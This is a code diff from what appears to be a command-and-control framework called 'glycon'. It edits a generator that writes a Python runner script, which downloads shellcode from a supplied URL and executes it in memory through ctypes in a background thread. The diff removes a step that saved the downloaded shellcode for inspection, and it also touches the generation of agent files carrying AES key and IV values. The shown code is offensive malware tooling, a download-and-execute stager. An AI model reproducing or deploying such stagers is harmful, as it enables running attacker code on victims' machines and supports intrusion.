@@ -15,9 +15,11 @@ from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
 import traceback  # For detailed error reporting
 
+
+
 def _generate_runner_script(shellcode_url, callback_url=None):
     """Generate the Python runner script that will download and execute shellcode"""
-    return f"""import socket
+    script = f"""import socket
 import ctypes
 import argparse
 import struct
@@ -45,17 +47,12 @@ def execute_shellcode(shellcode):
         shellcode_func()
 
     threading.Thread(target=run_shellcode).start()
-    # Shellcode runs in background thread without blocking
 
 def mi(little):
     print("Starting shellcode execution")
     try:
         shellcode = recv_shellcode(little)
         print(f"Downloaded {{len(shellcode)}} bytes")
-        # Save downloaded shellcode for inspection
-        with open('downloaded_shellcode.bin', 'wb') as f:
-            f.write(shellcode)
-        print("Saved downloaded shellcode to downloaded_shellcode.bin")
     except Exception as e:
         print(f"Error downloading file: {{e}}")
         return
@@ -68,6 +65,7 @@ if __name__ == "__main__":
     little = "{shellcode_url}"
     mi(little)
 """
+    return script
 
 
 def init_api_routes(app, socketio):
@@ -696,6 +694,8 @@ def init_api_routes(app, socketio):
                 aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
                 aes_iv=repr(CONFIG.aes_iv)     # Keep as bytes object
             )
+
+            # No obfuscation applied
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
